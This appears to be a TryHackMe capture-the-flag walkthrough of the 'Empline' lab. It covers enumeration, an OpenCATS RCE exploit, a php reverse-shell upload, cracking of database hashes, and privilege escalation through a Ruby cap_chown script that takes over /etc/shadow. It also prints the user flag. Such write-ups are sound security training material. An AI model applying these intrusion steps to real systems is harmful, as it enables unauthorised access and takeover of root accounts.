# Empline - tryhackme

## Enumeration

### Lets start with the initial scans with nmap 
```
# Nmap 7.92 scan initiated Mon Jul 18 01:07:28 2022 as: nmap -sC -sV -oN nmap 10.10.80.228
Nmap scan report for 10.10.80.228
Host is up (0.20s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c0:d5:41:ee:a4:d0:83:0c:97:0d:75:cc:7b:10:7f:76 (RSA)
|   256 83:82:f9:69:19:7d:0d:5c:53:65:d5:54:f6:45:db:74 (ECDSA)
|_  256 4f:91:3e:8b:69:69:09:70:0e:82:26:28:5c:84:71:c9 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Empline
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Jul 18 01:08:00 2022 -- 1 IP address (1 host up) scanned in 32.53 seconds

```
### We got two ports open, so we tried accessing the webserver and there is a simple static page with no paramters exploitable
![004.png](https://raw.githubusercontent.com/sigwotts/THM-Walkthrough/main/Empline/img/004.png)

### Next we tried bruteforcing directories using gobuster
```
/index.html           (Status: 200) [Size: 14058]
/assets               (Status: 301) [Size: 313] [--> http://10.10.80.228/assets/]
/javascript           (Status: 301) [Size: 317] [--> http://10.10.80.228/javascript/]

```
### Didn't find anything usefull, next we tried bruteforcing subdomains for that we have to add the IP to the /etc/hosts file as "empline.thm"
```
Found: job.empline.thm (Status: 200) [Size: 3671]
Found: gc._msdcs.empline.thm (Status: 400) [Size: 422]
Found: www.job.empline.thm (Status: 200) [Size: 3671]
Found: _domainkey.empline.thm (Status: 400) [Size: 422]
```

### Here we find some interesting subdomains so we added these to out /etc/hosts file, then after navigating to the job.empline.thm, we got this login page
![005.png](https://raw.githubusercontent.com/sigwotts/THM-Walkthrough/main/Empline/img/005.png)

## Exploitation

### Here we get to know that opncats is running, so lets find it is exploitable or not, using searchsploit we get to know that it is vulnerable to RCE
```
----------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                   |  Path
----------------------------------------------------------------------------------------------------------------- ---------------------------------
OpenCATS 0.9.4 - Remote Code Execution (RCE)                                                                     | php/webapps/50585.sh
OpenCats 0.9.4-2 - 'docx ' XML External Entity Injection (XXE)                                                   | php/webapps/50316.py
----------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```
### So here we mirrored the exploit in our attacker machine and it gives us a unstable shell
![006.png](https://raw.githubusercontent.com/sigwotts/THM-Walkthrough/main/Empline/img/006.png)

### So here we see the present working directory and we tried uploading our favourite php-reverse-shell in the current working directory, and we sucessfully managed to upload the reverse-shell on the server
![007.png](https://raw.githubusercontent.com/sigwotts/THM-Walkthrough/main/Empline/img/007.png)
![008.png](https://raw.githubusercontent.com/sigwotts/THM-Walkthrough/main/Empline/img/008.png)

### Now we have to call the shell by visiting the url
```
http://job.empline.thm/upload/careerportaladd/revshell.php
```
## Initial foothold
### Here we got the shell
![009.png](https://raw.githubusercontent.com/sigwotts/THM-Walkthrough/main/Empline/img/009.png)

### After visiting many directories on the server we find "config.php" in /var/www/opencats directory and in the file we got the credentials of mysql database
![001.png](https://raw.githubusercontent.com/sigwotts/THM-Walkthrough/main/Empline/img/001.png)

### After using these creds we are sucessfully managed to enter in the database
![011.png](https://raw.githubusercontent.com/sigwotts/THM-Walkthrough/main/Empline/img/011.png)

### Here we got the hashes of 3 users admin,george,james 
![012.png](https://raw.githubusercontent.com/sigwotts/THM-Walkthrough/main/Empline/img/012.png)

### We saves these hashes in a file names hash, next we tried crack these hashes using john 
![002.png](https://raw.githubusercontent.com/sigwotts/THM-Walkthrough/main/Empline/img/002.png)
## User Flag
### Here we find the password for the user george, and we use these creds to log in to the webserver using ssh and we sucessfully logged in to the server
![013.png](https://raw.githubusercontent.com/sigwotts/THM-Walkthrough/main/Empline/img/013.png)

### Here we find the user flag
```
george@empline:~$ cat user.txt
91cb89c70aa2e5ce0e0116dab099078e
```
## Priv esc

### We went through many directories but we didn't find anything intersting, then we tried to check the /etc/crontab file, there also we didn't find anthing intersting, then we upload linpeas to the server and the output gives something interesting
![014.png](https://raw.githubusercontent.com/sigwotts/THM-Walkthrough/main/Empline/img/014.png)

### So we tried googling it and we find that we can change the ownership of the file using cap_chown+ep using ruby 
```
https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities#cap_chown
```

### So to own the file we have to make a ruby script to change the permissions of the file, in our case we are changing the ownership of /etc/shadow file, so that we can change the root passwd and then we become root
### For that we have to built a ruby script 
```
https://apidock.com/ruby/FileUtils/chown
```

### We take the help of this article to make our ruby script, the script looks like this 
```
require 'fileutils'
FileUtils.chown 'george', 'george', '/etc/shadow'
```

### And now lets check the ownership of the /etc/shadow file
![015.png](https://raw.githubusercontent.com/sigwotts/THM-Walkthrough/main/Empline/img/015.png)

### Here we can see we own the file now, next we have to change the root password, in our case we copied the hash of the user george and paste that in the root hash, so that the password of george and root will become same
### Now we tried the same password we used for user george 
![016.png](https://raw.githubusercontent.com/sigwotts/THM-Walkthrough/main/Empline/img/016.png)

## BOOOOOOOOOOMMMMMMMMM!!!!!!!!!!!!!!! We are root and here we got the root flag
# <3 by sigwotts
